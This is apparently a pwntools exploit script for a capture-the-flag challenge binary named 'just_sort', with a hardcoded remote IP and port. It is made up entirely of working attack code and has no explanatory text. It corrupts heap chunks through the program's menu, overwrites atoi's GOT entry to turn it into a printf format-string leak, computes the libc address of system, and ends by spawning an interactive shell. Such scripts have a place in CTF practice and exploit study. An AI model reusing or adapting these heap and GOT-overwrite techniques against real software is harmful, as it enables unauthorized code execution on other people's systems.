from pwn import *
import sys, time

if len(sys.argv) == 1:
    p = process(["./just_sort"])

else:
    p = remote("159.65.125.233", "6005")

context.binary = "./just_sort"
binary = ELF("./just_sort")
#context.log_level = "debug"

def insert(size, memo):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", memo)

def edit(index, pos, memo):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(index))
    p.sendlineafter("> ", str(pos))
    p.sendafter("> ", memo)

def printf():
    p.sendlineafter("> ", "3")

def search(size, memo):
    p.sendlineafter("> ", "4")
    p.sendlineafter("> ", str(size))
    p.sendafter("> ", memo)

def delete(index, pos):
    p.sendlineafter("> ", "5")
    p.sendlineafter("> ", str(index))
    p.sendlineafter("> ", str(pos))

def hash_index():
    for i in xrange(0x64):
        print hex(i) + " : " + str((0xCCCCCCCCCCCCCCCD * i >> 64) >> 3)

# size index -> 0x0, 0xa, 0x14, 0x1e, 0x28, 0x32, 0x3c, 0x46, 0x50, 0x5a

bss = 0x0000000000602200

insert(0x18, p64(bss) * 3)
insert(0x18, p64(bss) * 3)
insert(0x18, p64(bss) * 3)
insert(0x18, p64(bss) * 3)

atoi_got = 0x0000000000602080

delete(2, 0)
search(0x18, p64(0x1337) * 3 + p64(0x21) + p64(bss) * 3 + p64(0x21) + p64(0) + p64(atoi_got))
insert(0x18, p64(bss) * 3)
edit(2, 0, p64(binary.plt["printf"])[:-2])
#p.send("$4$p")
p.send("%3$p")

p.recvuntil("which command?\n> ")
leak = int(p.recv(14), 0)
#libc_base = leak - 0x5de700
libc_base = leak - 0xf7260
system = libc_base + 0x45390
print hex(leak)
print hex(libc_base)
print hex(system)
p.sendafter("> ", "AA\x00")
p.sendafter("> ", "AA\x00")
p.sendafter("> ", "\x00")
p.sendafter("> ", p64(system))

p.sendafter("> ", "sh\x00")
p.interactive()
